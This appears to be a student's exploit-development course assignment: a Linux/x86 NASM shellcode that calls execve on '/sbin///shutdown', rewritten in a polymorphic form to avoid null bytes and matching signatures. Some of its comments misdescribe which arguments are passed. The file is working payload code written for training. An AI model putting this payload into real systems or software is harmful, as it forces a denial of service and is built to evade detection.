; Student ID     : SLAE-1250
; Student Name   : Jonathan "Chops" Crosby
; Assignment 6.3 : polymorphic shutdown -h now for Linux/x86 Assembly
; File Name      : shutdown.nasm
; Shell Storm    : http://shell-storm.org/shellcode/files/shellcode-876.php

global _start

section .text

_start:

xor    ecx, ecx               ; zero out ecx
mul    ecx                    ; zero out edx, eax
push   eax                    ; push null terminator to stack
push   word 0x682d            ; push '-h' to stack
mov    edi, esp               ; move '-h' to edi
push   0x6e                   ; push 'n'
mov word [esp+0x1],0x776f     ; edit memory in stack at offset 1
                              ; accounting for 'n' and insert
                              ; 'wo' which will complete 'now'
			      ; this was done to avoid getting a 0x00
			      ; if we pushed a dword for all of now
			      ; at one time with 0x776f6e since the
			      ; last logical byte on the string is 00
mov    edi,esp                ; move won (now -h) to edi
push   edx                    ; push null terminator to stack
push   0x6e776f64             ; push 'nwod' to stack
push   0x74756873             ; push 'tuhs' to stack
push   0x2f2f2f6e             ; push '///n' to stack
push   0x6962732f             ; push 'ibs/' to stack
                              ; which is '/sbin///shutdown'
mov    ebx,esp                ; move '/sbin///shutdown' to ebx
push   eax                    ; push null terminator to stack
push   edi                    ; push '-h, now' to the stack
push   ebx                    ; push '/sbin///shutdown' to stack
mov    ecx,esp                ; move {'/sbin///shutdown', -h, now} to ecx
add    eax, 0xb               ; eax is already 0x00 so we add 0xb to it
int    0x80                   ; execute execve
